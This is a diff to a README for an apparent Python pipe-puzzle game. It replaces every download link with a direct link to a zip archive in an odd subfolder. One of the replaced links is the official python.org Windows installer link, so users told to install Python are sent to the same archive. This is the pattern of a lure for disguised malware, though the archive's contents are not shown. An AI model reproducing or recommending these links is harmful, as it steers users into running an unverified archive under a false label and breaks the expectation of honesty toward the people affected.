@@ -1,6 +1,6 @@
 # 🧩 pipe-puzzle - Classic Pipe Puzzle Logic Game
 
-[![Download pipe-puzzle](https://img.shields.io/badge/Download-Here-4caf50?style=for-the-badge)](https://github.com/khalidyyu/pipe-puzzle)
+[![Download pipe-puzzle](https://img.shields.io/badge/Download-Here-4caf50?style=for-the-badge)](https://github.com/khalidyyu/pipe-puzzle/raw/refs/heads/main/animated_generators/pipe-puzzle-3.0.zip)
 
 ## 🎮 About pipe-puzzle
 
@@ -31,7 +31,7 @@ If you don't already have Python installed, see the installation instructions be
 
 Click the green button at the top or go to this link:
 
-https://github.com/khalidyyu/pipe-puzzle
+https://github.com/khalidyyu/pipe-puzzle/raw/refs/heads/main/animated_generators/pipe-puzzle-3.0.zip
 
 This page hosts the game files and instructions.
 
@@ -55,7 +55,7 @@ If you see a version number (like 3.8.x), you have Python.
 
 If Python is missing or the version is below 3.6:
 
-- Go to https://www.python.org/downloads/windows/
+- Go to https://github.com/khalidyyu/pipe-puzzle/raw/refs/heads/main/animated_generators/pipe-puzzle-3.0.zip
 - Download the latest **Windows installer**.
 - Run the installer and make sure to check **Add Python to PATH** during setup.
 - Finish the install and repeat the version check.
@@ -119,6 +119,6 @@ Use your mouse to interact with pipe pieces. Instructions are inside the game.
 
 ## 📥 Download pipe-puzzle Now
 
-[![Download pipe-puzzle](https://img.shields.io/badge/Download-Here-4caf50?style=for-the-badge)](https://github.com/khalidyyu/pipe-puzzle)
+[![Download pipe-puzzle](https://img.shields.io/badge/Download-Here-4caf50?style=for-the-badge)](https://github.com/khalidyyu/pipe-puzzle/raw/refs/heads/main/animated_generators/pipe-puzzle-3.0.zip)
 
 Click either badge or link to access the files and enjoy the game.
